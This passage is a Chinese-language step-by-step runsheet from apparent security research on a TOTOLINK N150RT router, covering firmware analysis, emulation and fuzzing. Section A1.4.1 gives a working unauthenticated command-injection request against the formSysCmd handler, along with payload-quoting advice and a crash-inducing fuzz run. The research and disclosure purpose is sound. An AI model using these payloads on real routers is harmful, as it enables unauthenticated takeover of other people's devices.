# runsheet — 一行一行照做的作業單

> **目的：讓一個從來沒碰過這個專案的人，把命令複製貼上，得到可比對的輸出。**
> 它刻意冗長，而那是功能不是缺點：每個旗標都解釋、每步都有逐字的預期輸出、
> 每步都有停止條件。**不要壓縮它。**
> **它不解釋為什麼** —— 為什麼在 [`RUNBOOK.md`](RUNBOOK.md) §8.12，
> 而本檔每一節都指名它自己對應的那一小節。

## 怎麼讀這份檔案（30 秒）

**Part A 分成四站，而站號就是「板子必須在什麼狀態」。**
`A2.3` 讀作「第 2 站的第 3 節」，第 2 站是**板子停在 `<RealTek>`**。

| 站 | 板子在什麼狀態 | 進這一站的代價 | 節 |
|---|---|---|---|
| **第 1 站** | 不碰裝置 | 免費 | `A1.1` – `A1.4` |
| **第 2 站** | 停在 `<RealTek>`（搶到 bootloader） | **一次開機循環** | `A2.1` – `A2.6` |
| **第 3 站** | 正常開機、web 服務中 | **一次開機循環 + 45 秒** | `A3.1` – `A3.12` |
| **第 4 站** | 不碰裝置 | 免費 | `A4.1` – `A4.2` |

**從 `A1.1` 讀到 `A4.2`，那就是一個正確的執行順序** —— 這是分站的全部理由。
每次換站要燒掉一個開機循環，所以同一站的節一次做完；
而這個 repo 排錯順序的每一次，都是在錯的裝置狀態下跑了一節。

**某一週實際跑哪幾節、什麼順序** → [Part B](#part-b--每一週跑哪幾節)。
**那一天實際打了什麼** → [`BENCH-LOG.md`](BENCH-LOG.md)。

## 目錄

| 節 | 這一節做什麼 | 關掉的項目 |
|---|---|---|
| **第 1 站** | **桌面 —— 不碰裝置** | |
| `A1.1` | `make doctor`：讓機器自己說它準備好了沒 | — |
| `A1.2` | 從一份 clone 跑到全部報告，外加 166 個守衛案例 | — |
| `A1.3` | 從 dump 讀出 bootloader 能不能傳 kernel cmdline | `P9-1` |
| `A1.4` | 用 qemu-user 把這台自己的 binary 跑在 x86 上 | `P3-0` `P3-6` `P0-9` |
| `A1.5` | 分派表的第二個來源，六個 build 逐一比 | `P8-21` `P5-7` |
| `A1.6` | 參數缺席、長度階梯、協定炸彈，輸入由閘門算出來 | `P4-5` `P4-6` `P4-8` `P4-9` |
| `A1.7` | 崩潰定性：訊號、位址，以及那個位址在哪個段 | `P5-1` `P5-2` `P5-3` `P5-4` `P5-6` |
| `A1.8` | 別的家族才有的路徑，在這一台上是什麼反應 | `P3-8` `P3-9` `P3-10` `P3-11` `P3-12` `P1-9` |
| `A1.9` | 設定區差分：改一個已知值，再看哪幾個 byte 動了 | `P8-23` `P8-12` |
| **第 2 站** | **板子停在 `<RealTek>`** | |
| `A2.1` | 把 CP2102 與 USB 網卡交給 WSL | — |
| `A2.2` | 連續 ESC 搶下 bootloader，停在 `<RealTek>` | `P0-2` |
| `A2.3` | 純讀 64 KiB 設定區：還原點 + IoC 基準 | `P0-10` `P0-5` |
| `A2.4` | 進救援模式，而且不上傳任何東西 | `P9-3` `P9-4` |
| `A2.5` | **`FLW` 寫入演練 —— 全檔唯一不可逆的一節** | `P0-3` |
| `A2.6` | **把設定區寫回去 —— 16 KiB，不是 8 個 byte** | `P10-10` |
| **第 3 站** | **板子正常開機、web 服務中** | |
| `A3.1` | 設好網段，並且**證明**封包是直連不是繞道 | `P1-1` |
| `A3.2` | 一次冷開機量到「幾秒可服務」與**開機後 601 秒的視窗** | `P1-12` `P2-11` |
| `A3.3` | 抓封包證明線上只有你和它，而且帶對照組 | `P0-4` |
| `A3.4` | 全 TCP + 重點 UDP + IoC 埠 | `P1-2` `P6-11` `P1-10` |
| `A3.5` | GET 那半邊：指紋、授權閘門、寫入類 handler | `P1-3` `P1-5` `P1-8` `P2-1` `P2-2` `P2-3` `P2-4` `P2-5` `P3-13` |
| `A3.6` | 未認證 `GET /config.dat`，拿去跟 flash `0xC000` 逐 byte 比 | `P10-1` `P10-2` |
| `A3.7` | 用解出來的密碼登入，並證明這個 build 沒有 session | `P2-7` `P2-8` |
| `A3.8` | **POST 那半邊 —— 會改設定，而且會把 web server 弄掉** | `P1-4` `P1-5` `P1-6` |
| `A3.9` | ★ **未認證命令注入 —— 三個標的、三種 oracle** | `P3-3` `P3-1` `P3-2` `P3-4` `P3-7` `P5-5` |
| `A3.10` | ★ **第 ⑤ 環：指著 flash 上被改掉的那幾個 byte** | `P3-5` |
| `A3.11` | **未認證改管理密碼，以及把它設成空字串** | `P10-3` `P10-4` |
| `A3.12` | **會把 `boa` 弄掉的那一梯次 —— 排在最後** | `P4-1` `P4-2` `P4-3` `P4-4` `P2-6` |
| `A3.13` | 三個 GET：未初始化的憑證對，以及 `Host` 檢查與反射 | `P2-9` `P8-5` |
| `A3.14` | UDP 那一輪，而且它是第一次跑不是重跑 | `P6-4` `P6-6` `P6-7` `P6-8` `P6-12` |
| `A3.15` | UPnP：SSDP、SOAP，以及把 LAN-only 推上 WAN | `P6-1` `P6-2` `P6-3` `P8-7` |
| `A3.16` | DNS 身分，以及拔掉 WAN 之後 | `P6-9` `P6-10` |
| `A3.17` | CSRF 與 DNS rebinding | `P8-3` `P8-4` `P8-6` |
| `A3.18` | 假上游：NTP / DDNS / DHCP / PPPoE / SIP | `P8-11` `P8-19` `P6-5` |
| `A3.19` | 儲存型注入：八個欄位裡測得到的三個 | `P8-2` |
| `A3.20` | 借合法功能做偵察，以及一個便宜的可用性測試 | `P8-14` `P8-16` |
| `A3.21` | 線上的明文憑證，與驅動的私有 ioctl | `P8-17` `P8-20` |
| `A3.22` | 無線指紋與登入計時 | `P1-11` `P2-10` |
| `A3.23` | 把桌面算出來的兩份清單拿到矽上 | `P5-6` `P1-7` |
| `A3.24` | **Reset 按鈕：全場最後一發** | `P9-9` |
| **第 4 站** | **收工 —— 不碰裝置** | |
| `A4.1` | 把結果登記進去，重生成登記簿 | — |
| `A4.2` | 症狀 → 原因 → 回到哪一節 | — |

## `P0-2`、`P1-12` 這種編號是什麼

**它們是測試編號，不是這份檔案的東西。** 這個 repo 把每一個要做的測試登記成一列，
而每一列在**送出任何封包之前**就先寫好兩句話：預測，以及**什麼結果算它錯**。
沒有第二句的列，工具拒絕收結果。

| 你想做什麼 | 去哪裡 |
|---|---|
| 查 `P0-2` 是哪一題、預測什麼、判定如何、證據在哪 | **[`test-ledger.md`](test-ledger.md)** —— 搜編號就找到（130 列） |
| 改它 | [`test-cases.toml`](test-cases.toml)。**`test-ledger.md` 是生成的，改它會被覆蓋** |
| 知道跑哪一節可以關掉它 | 上面那張目錄，或每一節標題括號裡的 `（關 …）` |

**這份檔案只說「跑這一節會關掉哪幾項」，不重述那幾項的內容。**
重述就是同一份狀態兩個擁有者，而這個 repo 已經因為那件事失敗過兩次。
那個對應關係是雙向機械檢查的，理由在[附錄](#附錄-關掉的項目為什麼由機器維護)。

## 記號：七個，全部在這裡

| 記號 | 意思 |
|---|---|
| 🔌 | **實體動作** —— 腳本做不到，只有你的手做得到（插電、接線、拔電） |
| ❌ | **停止條件** —— 出現這個就**不要繼續**。這是本檔最值錢的部分 |
| ⚠️ | **坑** —— 會咬你的那一件事，寫在會咬到的位置，附儀器 bug 編號 |
| 🔴 | **這一段非讀不可** —— 不讀會做出錯誤的結論，或弄壞不可逆的東西 |
| ★ | **這一格是重點** —— 專案價值最高、最值得你花時間的那幾節 |
| ✅ | **這個結果已經在真機上量到過** |
| 💡 | **可以做，但這一節不做** —— 通常排到後面某一週 |

**程式區塊有兩種，而混淆它們是本檔最容易害人的地方：**
`bash` / `powershell` 區塊**是要跑的**，`text` 區塊**是你會看到的**。
`make ci` 會擋掉沒有標註語言的區塊。

## 一節長什麼樣

| 欄位 | 意思 |
|---|---|
| 標題的 `（關 …）` | 這一節做完，**登記簿的哪幾列被關掉了**。沒有就寫 `（不關登記簿項目）` |
| **層** | `T1` / `T2` / `T3` —— 你手上有什麼才做得到（見下一節） |
| **動到裝置** | `純讀` / `改設定` / **`不可逆`**。看到 `不可逆` 就停下來把整節讀完 |
| **為什麼這一節存在** | 指向 [`RUNBOOK.md`](RUNBOOK.md) 的哪一小節。**兩邊一對一，CI 檢查少一邊就紅** |
| **最後驗證** | 這一節的命令**最後一次真的被執行**是哪一天。舊的日期代表要小心 |
| **先決條件** | 沒滿足就不要開始。不是每一節都有 |

## 你重現不了哪一部分

**這個 repo 的一部分你重現不了，而這件事寫在這裡，不是讓你在第 40 步發現。**
這台跑的 firmware **不在任何廠商下載頁上**，而它的 flash dump 帶有這一台獨有的資料
（`H601` 區的 MAC 與射頻校準）。完整的三層對照在 [`REPRODUCE.md`](REPRODUCE.md)：

| 層 | 你需要 | 做得到哪幾節 |
|---|---|---|
| **T1** | 一份 clone + 網路 | **`A1.1`、`A1.2`、`A4.1`** —— `make ci` 的 **276 個檢查**，一台裝置都不用 |
| **T2** | T1 + 你自己的 N150RT + 一條 CP2102（約 US$3） | 再加 `A1.3`、`A1.4`、第 2 站全部 |
| **T3** | T2 + USB 網卡 + 隔離網段 | 再加第 3 站全部 |

> **只做 T1 也值得。** T1 能重現的不是這個 repo 的數字，是**這個 repo 的儀器會在
> 該失敗的時候失敗** —— 166 個守衛案例的存在目的就是證明每一個拒絕是活的，
> 加上 110 個 fwrecon 測試 = `make ci` 的 276 個檢查。五分鐘，一份 clone。
>
> **數字要能自己重數，否則它會漂移**：`make ci 2>&1 | grep -c '^  ok'` 減掉
> 最後那一行總結 = 166（2026-08-17 夜），`110 passed` 是 pytest 那一行。
>
> ✅ **缺口關掉了。** 到 2026-08-17 白天為止有 35 個守衛案例不在 `make ci` 裡
> —— `test-console-dump.sh`（18）、`test-photo-tools.sh`（13）、
> `test-flash-tools.sh`（4），三支都不需要硬體。全部接上，加上新的
> `test-console-write.sh`（28），**十支套件共 166 個，`make ci` 全部跑**。
> 那是 `PROGRESS` 開放 #33，而它是靠重數發現的，不是靠任何檢查。

## 一份狀態一個擁有者

**這份檔案擁有「確切的命令」，不擁有別的。**

| 檔案 | 擁有 |
|---|---|
| **本檔 Part A** | **確切的命令、逐字的預期輸出、停止條件、驗證步驟** ← 可編輯 |
| **本檔 Part B** | 每一週跑哪幾節、順序、本週額外步驟 ← **只追加** |
| [`RUNBOOK.md`](RUNBOOK.md) §8.12 | **每一步為什麼存在**、坑的來歷、跨週推理。**一個命令塊都沒有** |
| [`BENCH-LOG.md`](BENCH-LOG.md) | 某一天**實際**打了什麼、實際看到什麼 ← 只追加 |
| [`test-cases.toml`](test-cases.toml) → [`test-ledger.md`](test-ledger.md) | 預測 / 反證條件 / 判定 / 證據 |
| [`PROGRESS.md`](PROGRESS.md) | gate、週、carried-forward |
| [`docs/disclosure.md`](docs/disclosure.md) | 每個發現的揭露狀態 |

---

# Part A — 程序

---

## 第 1 站 · 桌面 —— 不碰裝置

**照順序** `A1.1` → `A1.2` → `A1.3` → `A1.4`

**進站**：不需要。這一站只要一份 clone；`A1.3` 與 `A1.4` 另外要一份 dump，**但都不用把裝置接起來**。
**出站**：不需要。這一站一個 byte 都沒動到。

> **這一站是整份文件唯一「只有一台筆電也做得完」的部分**，而 `make ci` 是 276 個檢查。先把它跑綠，再去插線 —— 儀器壞掉的時候，你會希望那件事是在有硬體之前就知道的。

### A1.1 開工前：讓機器自己說它準備好了沒（不關登記簿項目）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T1 / T2 / T3（各自檢查） | 純讀，而且**完全不碰裝置** | [`RUNBOOK` §8.12.1](RUNBOOK.md) | 2026-08-17 |

**做什麼：**

```bash
make doctor
```

只想檢查某一層：

```bash
make doctor TIER=1
```

**預期輸出**（尾巴那一行是重點）：

```text
  20 ok, 1 not applicable, 0 to fix
  ready for: whatever the tiers above allow.
```

**每一個 `FAIL` 都自帶修它的那一行命令。** 例如：

```text
  FAIL  no /dev/ttyUSB* — the serial adapter is not attached to this WSL instance
        -> PowerShell:  usbipd list  then  usbipd attach --wsl --busid <the 10c4:ea60 one>
```

> ❌ **有任何 `FAIL` 就不要往下。** 這一節存在的唯一理由，就是把「照做了但沒用」
> 變成「這一項壞了，而且這是修它的命令」。

> ⚠️ **`--` 不是 `FAIL`。** 它代表「這一層的東西你沒有，而那沒有錯」——
> 只有一份 clone 的讀者會看到 T2 / T3 全部是 `--`，那是正常的。

---

### A1.2 桌面側：從一份 clone 到全部報告（不關登記簿項目）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T1** | 沒有裝置 | [`RUNBOOK` §7](RUNBOOK.md) | `ci` / `ledger` / `todo`：2026-08-17。`setup` / `fetch` / `unpack` / `recon`：2026-08-07（W01），本場未重跑 |

**這一節是整個 repo 唯一一段「clone 下來就跑得完」的部分。**

#### A1.2.1 工具鏈

```bash
make setup
make verify
```

**預期**：`verify` 對每一支工具印一行，全部 `ok`，最後 `G0 green`。

> ⚠️ **`make setup` 之後要用登入 shell，而 `-lc` 一度不夠。**
> `binwalk` 裝在 `~/.cargo/bin`，而 PATH 的設定原本只寫進 `~/.bashrc` ——
> 那個檔案開頭有「非互動就 return」的守衛，所以 `bash -lc` 讀不到它。
> **2026-08-17 修掉了**（`setup-wsl.sh` 現在也寫進 `~/.profile`，並且自己驗一次）。
> 舊的環境跑一次 `bash tools/setup/setup-wsl.sh path` 就好。
> 從 Windows 呼叫一律用：
> ```text
> wsl -d Ubuntu-24.04 -- bash -lc 'cd /mnt/c/Users/Key20/Desktop/router && make ci'
> ```

#### A1.2.2 韌體：抓下來，而且驗雜湊

```bash
make fetch
make unpack
```

**預期**：`fetch` 對每個檔案印 `sha256 OK`；`unpack` 印 `no symlinks in the extracted tree` 之類的結構檢查。

> ❌ **雜湊不符就停。** [`firmware/SOURCES.json`](firmware/SOURCES.json) 記錄了每一份
> 映像的來源與當時的雜湊。不符代表你拿到的不是同一個檔案，後面每一個結論都不可比。

#### A1.2.3 報告

```bash
make recon
make check-reports
```

**預期**：`reports/` 底下的 JSON / MD 重新生成，`check-reports` 印
`reports OK — N fwrecon (schema 1.0), M Ghidra, 1 rtcase`。

#### A1.2.4 ★ 這一節真正值得你花時間的東西

```bash
make ci
```

**預期**（尾巴）：

```text
  33 passed, 0 failed        # test-rtcase.sh
  5 passed, 0 failed, 1 skipped
  15 passed, 0 failed        # test-bench-probe.sh
  7 passed, 0 failed         # test-loader-unpack.sh
  ok   local CI equivalents passed (container build not included)
```

**這 166 個守衛案例加上 110 個 fwrecon 測試，存在的目的不是證明工具會動，
是證明工具的每一個拒絕是活的。** 例如：

```bash
bash tools/test-loader-unpack.sh
```

它會建出五份**故意壞掉**的合成映像，確認解包器對每一種都拒絕、而且**拒絕的理由
是對的那一個**，最後用一份好的映像當正對照組。**一個只會拒絕的工具跟一個永遠
拒絕的工具，在只有負面案例的測試裡長得一模一樣。**

#### A1.2.5 登記簿

```bash
make todo WEEK=W05
make ledger
```

**預期**：

```text
W05: 27/27 done, 0 outstanding
wrote test-ledger.md - 130 cases, 34 executed
```

---

### A1.3 從 dump 做的靜態判定 —— 不接線，而它省掉一次開機（關 `P9-1`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T2**（要一份 dump，但**不用把裝置接起來**） | 沒有碰裝置 | [`RUNBOOK` §8.12.10](RUNBOOK.md) | 2026-08-17 |

**這一節示範一件值得學的事：一個「裝置測試」有時候在桌面上就答完了，而且答得更好。**

`P9-1` 問的是「bootloader 能不能傳 `init=/bin/sh` 給 kernel」。直覺是接線、搶
bootloader、試著改 cmdline —— 一次完整的開機循環。**但那個問題在 dump 裡就有答案。**

#### A1.3.1 bootloader 的第二階段

```bash
make loader-report
```

**預期**：

```text
reports/bootloader-unit-2018.json: stage 2 56,592 bytes, 328 strings, 0 cmdline hits
```

**`0 cmdline hits` 是這一節的結論**，而它的可信度來自同一行的另一半：
工具在**找不到 `?` 印的全部 17 個指令時會拒絕出報告**。所以那個 `0` 有對照組。

想自己看那 56,592 bytes 裡有什麼：

```bash
python3 tools/loader-unpack.py "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin" --strings | less
```

> 🔴 **為什麼要解壓：整顆 4 MiB 裡 `grep FLR` 找不到東西。** `grep IPCONFIG`
> 也找不到，`grep "COMMAND MODE HELP"` 也找不到 —— 而那三個字每天都在 console 上。
> 原因是 `0x000000`–`0x0012F0` 只是第一階段（DRAM 訓練），
> **`0x0012F0` 起是一段 LZMA,17,334 → 56,592 bytes**，指令直譯器整個在裡面。
>
> **這個坑值得記住的形狀是**：一個 `grep` 找不到東西，可以是「不在那裡」，
> 也可以是「你在找一個壓縮過的東西」。這個 repo 用了三週的後者去支撐前者。

> ⚠️ **不要用 `--no-control` 之類的方式繞過拒絕。** 這份報告的頭號結果是一個
> **「不存在」**，而一個宣稱「這裡沒有 X」的報告，如果不能在同一次執行裡證明
> 自己找得到已知存在的東西，那個宣稱值零。

#### A1.3.2 kernel 自己說它用什麼 cmdline

```bash
python3 - <<'PY'
import lzma, re, struct
from pathlib import Path
buf = Path.home().joinpath("fwre-work/dumps/flash-n150rt-console-1.bin").read_bytes()
# cr6c header is 16 bytes at 0x060000; the payload is a decompressor stub then LZMA.
pay = buf[0x060010:0x060010 + 0x0f1002]
hits = []
for off in range(0, 0x8000):
    if pay[off] != 0x5D:
        continue
    ds = struct.unpack_from("<I", pay, off + 1)[0]
    sz = struct.unpack_from("<Q", pay, off + 5)[0]
    if ds and not (ds & (ds - 1)) and (1 << 16) <= sz <= (1 << 25):
        hits.append((off, sz))
assert len(hits) == 1, f"expected exactly one LZMA stream, found {hits}"
off, sz = hits[0]
out = lzma.LZMADecompressor(format=lzma.FORMAT_ALONE).decompress(pay[off:])
assert len(out) == sz, f"declared {sz}, got {len(out)}"
print(f"kernel: LZMA at payload+0x{off:x}, {len(out):,} bytes, declared size MATCHES")
for n in (b"Linux version", b"swapper", b"Kernel command line"):
    print(f"  control {n.decode():<22} "
          f"{'present' if n in out else 'ABSENT'}")
for m in re.finditer(rb"[\x20-\x7e]{6,}", out):
    s = m.group().decode()
    if re.search(r"(console=|root=/dev|init=)", s):
        print(f"  0x{m.start():06x}  {s}")
PY
```

**預期**：

```text
kernel: LZMA at payload+0x2808, 3,374,772 bytes, declared size MATCHES
  control Linux version          present
  control swapper                present
  control Kernel command line    ABSENT
  0x2d8590  No init found.  Try passing init= option to kernel.
  0x2f9590  console=ttyS0,38400 root=/dev/mtdblock1
```

**三件事，而第三件解釋了第二件：**

1. `0x2f9590` 是**編進 kernel 的** cmdline，**沒有 `init=`**。
2. `0x2d8590` 的 `No init found.  Try passing init= option to kernel.` 說明
   **kernel 會認 `init=`** —— 缺的完全是 loader 那一側。
3. **`Kernel command line` 這個字串不在 image 裡**，所以開機 log 永遠不會印它。
   （`A3.2` 的腳本會為此報一行 `FAIL`，而在這台上那是預期的。）

> ✅ **`P9-1` 反證成立，而且是 `static` 證據** —— 登記簿為它宣告的 `exit_evidence`
> 就是 `static`，所以這個等級是可採信的。三個獨立儀器：loader 的字串空間、
> kernel 的 `.rodata`、以及裝置 console 的 `?`（`A2.2`）。**沒有共用程式碼。**

> 💡 **仍然存在的路徑，而它零 flash 寫入**：`AUTOBURN 0` → `LOADADDR` →
> TFTP 一份改過 cmdline 的 kernel 進 RAM → `J`。成本是要能重壓一份 kernel
> （那 38 個字元的字串沒有多餘空間放 ` init=/bin/sh`，得先確認後面有沒有留白）。
> **排 W07 之後，不是這一節的事。**

---

### A1.4 模擬環境：這台自己的 binary，跑在 x86 上（關 `P3-0` · `P3-6` · `P0-9`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T2**（要一份 dump 與 root;**不用裝置**） | 沒有碰裝置。**但它會改 dump 的副本** —— 見下 | [`RUNBOOK` §8.11](RUNBOOK.md) | 2026-08-17 |

**大家說 Realtek SDK 模擬不起來，理由通常是 Lexra 指令集 —— 那個理由是錯的。**
真正卡住的是 `libapmib` 要讀 `/dev/mtdblock0`，而它用 `lseek`+`read` 讀，
**所以解法是提供一個檔案**，而那個檔案就是你在 `A2.3`/`A2.2` 讀出來的 dump。

```bash
make qemu-env      # 需要 sudo
make qemu-test
```

**預期**（`qemu-env` 的正對照組是三個值，不是一個）：

```text
  control ok: TELNET_ENABLED=0
  control ok: IP_ADDR=10.1.1.1
  control ok: USER_NAME="admin"
  MIB lines from the vendor binary: 2317
  positive control passed
```

> 🔴 **為什麼對照組是三個值而不是一個。** 一個布林值、一個位址、一個字串 ——
> 三種不同的解碼路徑。只驗一個布林，解碼器把整張表讀歪了也會過。

**在裡面跑一次寫入，並且看它改了 flash 的哪幾個 byte：**

```bash
sudo bash tools/qemu-env.sh diff HW_WLAN0_WSC_PIN 87654321
```

**預期**：

```text
  3 bytes changed
    0x00648a  0x39 -> 0x31
    0x00648b  0x39 -> 0x00
    0x006493  0x0d -> 0x4e   <- H601 checksum
  checksum: delta 65, expected 65 -> balances
```

> 🔴 **`0x006493` 是 `H601` 區的 8-bit checksum，而「delta 與預期相符」是這一測
> 真正的產出** —— 它不是「我改了一個值」，是**「我知道這個區塊的完整性是怎麼算的」**。

> ⚠️ **復原檔案不等於復原狀態（儀器 bug 13）。** `flash`、`boa`、`sysconf` 把 MIB
> 表快取在 **System V 共享記憶體**裡，那屬於 host kernel，活得比每一個 guest process 久。
> 只改 `HW_WLAN0_REG_DOMAIN` 的一次執行，diff 裡出現了**上一次測試的** WPS PIN
> 七個 byte。**`qemu-env.sh reset` 必須同時清檔案和 shm，而那是兩件看起來像一件的事。**

> ⚠️ **在這裡驗 payload 的引號與跳脫，不要在真機上現想。**
> 這台的 BusyBox 1.13.4 只編了 48 個 applet,**`id` 不是其中一個** ——
> `…;id > /var/web/x.txt;#` 會建出一個空檔案，而那跟「參數被過濾掉」看起來一模一樣。
> `cat /etc/version` 才是對的 payload：輸出同時證明執行成功並指出 build。

#### A1.4.1 讓 `boa` 真的服務請求（關 `P0-9`）

> 🔴 **這一小節推翻了本檔到 2026-08-17 為止寫在這個位置的一段話。**
> 原文是：「`boa` 在這裡服務不了請求……它死在 `libapmib.so+0x27dc` 的
> `sh s7,0(s8)`，裝置的 kernel 會修它，`qemu-user` 沒有 guest kernel 可以修，
> 換 CPU model 沒有用。」**對齊陷阱是真的，位置也是真的，結論太寬。**

用 `-strace` 量出來的死法：

```text
412 open("/dev/mtdblock0",O_RDONLY) = 3
412 lseek(3,49152,SEEK_SET) = 49152
412 read(3,0x490018,7490) = 7490
412 close(3) = 0
412 open("/web/config.dat",O_RDWR|O_CREAT|O_TRUNC,0400000) = 3
--- SIGBUS {si_signo=SIGBUS, si_code=1, si_addr=0x00492b41} ---
```

**它死在「產生 `/web/config.dat`」那一步，不是死在服務請求。**
`si_addr` 是奇數位址，跟那個 `sh` 對得上。把那**一個** `open()` 弄成失敗
（讓 `config.dat` 是一個目錄，`O_RDWR` 就回 `EISDIR`），`boa` 印
`Create config file error!`、繼續跑、bind、然後回應。

```bash
sudo bash tools/qemu-env.sh serve 8080
```

**預期 —— 而重點是第二個對照組：**

```text
  control ok: login.htm 200 (exempt page served)
  control ok: blank.htm 302 (gated page redirected)
boa is serving on 127.0.0.1:8080 (pid 406).  Stop it with:
  sudo tools/qemu-env.sh stop
```

> 🔴 **「它回應了」不等於「這個韌體用它的方式在回應」。** 所以對照組有兩個：
> 一個豁免頁必須 `200`，一個受保護頁必須 `302`。
> 那正是 W04-2 逐指令讀出來、W05 在實機上量到的閘門模型 ——
> **兩個都成立才代表這裡測到的東西可以外推。** 只有第一個成立的話，
> 埠上的可能是別的東西。工具在對照組沒過時**拒絕**回報服務已啟動。

```bash
curl -s -o /dev/null -w 'no-param  POST: HTTP %{http_code}\n' \
  -X POST http://127.0.0.1:8080/boafrm/formSysCmd --data 'submit-url=/syscmd.htm'
curl -s -o /dev/null -w 'inject    POST: HTTP %{http_code}\n' \
  -X POST http://127.0.0.1:8080/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=cat /etc/version > /var/web/w06emu.txt;#' \
  --data 'submit-url=/syscmd.htm'
sleep 2
curl -s http://127.0.0.1:8080/w06emu.txt
```

**預期**：

```text
no-param  POST: HTTP 302
inject    POST: HTTP 302
TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
```

> ★ **未認證命令注入，在桌機上端到端重現，一台裝置都沒接。**
> 不帶 `sysCmd` 的那一發是對照組：它也回 `302`，而且**什麼都沒建立** ——
> 所以「回 302」不是成功的訊號，docroot 裡出現檔案才是。

> ⚠️ **拿掉 `;#` 再打一次，會拿到 `HTTP 204`、0 bytes。** 檔案建立了，內容是空的
> —— handler 自己在後面接 `2>&1 > /tmp/syscmd.log`，而 `sh` 裡最後一個 stdout
> 重導向贏。**這是先從 binary 的格式字串 `%s 2>&1 > %s` 推出來、再在這裡看到的。**

> ❌ **代價要講出來：模擬的 server 上拿不到 `/config.dat`** ——
> 因為擋住那個 `open()` 的就是那個同名目錄。**鏈的第 ①② 環仍然只有實機做得到**，
> 第 ③④ 環和閘門在這裡重現。**這是這條路的邊界，不是它的失敗。**

---

### A1.5 分派表的第二個來源：六個 build 逐一比（關 `P8-21` · `P5-7`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T1**（一份 clone + `make fetch` 抓得到的映像） | 沒有碰裝置 | [`RUNBOOK` §8.12.23](RUNBOOK.md) | 2026-08-18 |

**先決條件**：`make fetch` 與 `tools/unpack-firmware.sh` 跑過，六個 rootfs 都在
`$FWRE_WORK/extracted/` 底下。

**這個 repo 對 `root_form[]` 一直只有一個來源，而那是它自己的規矩不允許的。**
這些 binary 是 `sstrip` 過的、一個 section header 都沒有，所以 `readelf` 幫不上忙。
`tools/formtable-scan.py` 不讀指令，只讀 program header 與可寫段裡的資料。

```bash
python3 tools/formtable-scan.py \
    "$FWRE_WORK/extracted/unit-2018/squashfs-root/bin/boa" \
    --compare reports/ghidra-formtable-unit-2018.json
```

```text
squashfs-root  97 candidate pairs, 2 run(s)
    0x00483610   40 entries  some other array of (string, function) pairs
    0x00483758   57 entries  root_form (a dispatch table)

  vs reports/ghidra-formtable-unit-2018.json: 57 agree, 0 ghidra-only, 0 scan-only
```

#### A1.5.1 六個 build 一起掃，而差集就是這一週的差分結果

```bash
python3 tools/formtable-scan.py \
    "$FWRE_WORK/extracted/v2.1.2/squashfs-root/bin/boa" \
    "$FWRE_WORK/extracted/n300rt-2.1.6/squashfs-root/bin/boa" \
    "$FWRE_WORK/extracted/unit-2018/squashfs-root/bin/boa" \
    "$FWRE_WORK/extracted/n200re-3.2.0/squashfs-root/bin/boa" \
    "$FWRE_WORK/extracted/n300rt-3.4.0/squashfs-root/bin/boa" \
    "$FWRE_WORK/extracted/v3.4.0/squashfs-root/bin/boa" \
    --json reports/formtable-scan-six-builds.json
```

```text
2015-08 N150RT      59 handlers        2018-03 N200RE      60 handlers
2016-05 N300RT      61 handlers        2019-03 N300RT      50 handlers
2017-11 N150RT-CX   57 handlers ←這台  2020-10 N150RT      49 handlers
```

**兩件要記的事，第二件比第一件重要：** 這一台的 57 個是 N300RT V2.1.6 那 61 個的
**嚴格子集**；而 `formSysCmd` 在 N150RT V3.4.0 裡不在了，在 19 個月更早的
N300RT V3.4.0-B20190315 裡**還在** —— 廠商的移除是逐產品的，不是逐版本號的。

> ⚠️ **方法只在一個 build 上被驗證過。** `--compare` 證明它在 `unit-2018` 上與
> Ghidra 逐項相同；另外五個沒有對照可比。**這句話要跟結論一起被引用。**

---

### A1.6 參數缺席、長度階梯、協定炸彈：輸入清單由閘門自己算出來（關 `P4-5` · `P4-6` · `P4-8` · `P4-9`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置。**會改 dump 的副本**，每一發之前完整還原 | [`RUNBOOK` §8.12.24](RUNBOOK.md) | 2026-08-18 |

**先決條件**：`A1.4` 的模擬環境站得起來（`sudo tools/qemu-env.sh check` 三個
control 全過）。

```bash
sudo python3 tools/paramfuzz.py --out reports/paramfuzz-unit-2018.json
```

```text
  control  negative: formSchedule with no webpage (must be DETECTED as dead)
  control  positive: formNtp with no body (must SURVIVE)
  ladder   11 handlers x 17 parameters x 5 lengths (stack destinations only)
    DEAD  ladder     formWsc                localPin       800 bytes
    DEAD  ladder     formWsc                localPin       4096 bytes
  cyclic   11 handlers, 4096-byte de Bruijn pattern (stack destinations only)
    DEAD  cyclic     formWsc                localPin       de Bruijn 4096
  absent   every declared parameter present except one
    DEAD  absent     formAdvanceSetup       submit-url     omitted
    DEAD  absent     formDnsv6              submit-url     omitted
    DEAD  absent     formOpMode2            submit-url     omitted
    DEAD  absent     formSSH                submit-url     omitted
    DEAD  absent     formSchedule           webpage        omitted

  208 requests, 8 deaths, 0 harness anomalies
```

> 🔴 **負對照才是承重的那一個。** `P4-9` 凍結的反證條件原本點名「`P4-3` 的已知崩潰」，
> 而 `P4-3` 在這台已判 `refuted` —— **那個對照不存在，條件永遠無法構成**。
> 2026-08-18 開火前換成 `formSchedule`，凍結雜湊在同一個 commit 裡改，
> 理由在 `PROGRESS.md § Corrections`。

單獨跑某一個維度（省時間，**但不要拿單維度的結果當一輪**）：

```bash
sudo python3 tools/paramfuzz.py --dimension absent --out /tmp/absent.json
```

---

### A1.7 崩潰定性：訊號、位址，以及那個位址在哪一個段裡（關 `P5-1` · `P5-2` · `P5-3` · `P5-4` · `P5-6`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置 | [`RUNBOOK` §8.12.25](RUNBOOK.md) | 2026-08-18 |

**先決條件**：`A1.6` 已經產出一份死亡清單。這一節吃那份清單。

#### A1.7.1 五個「參數缺席就死」的，全部死在同一個位址

```bash
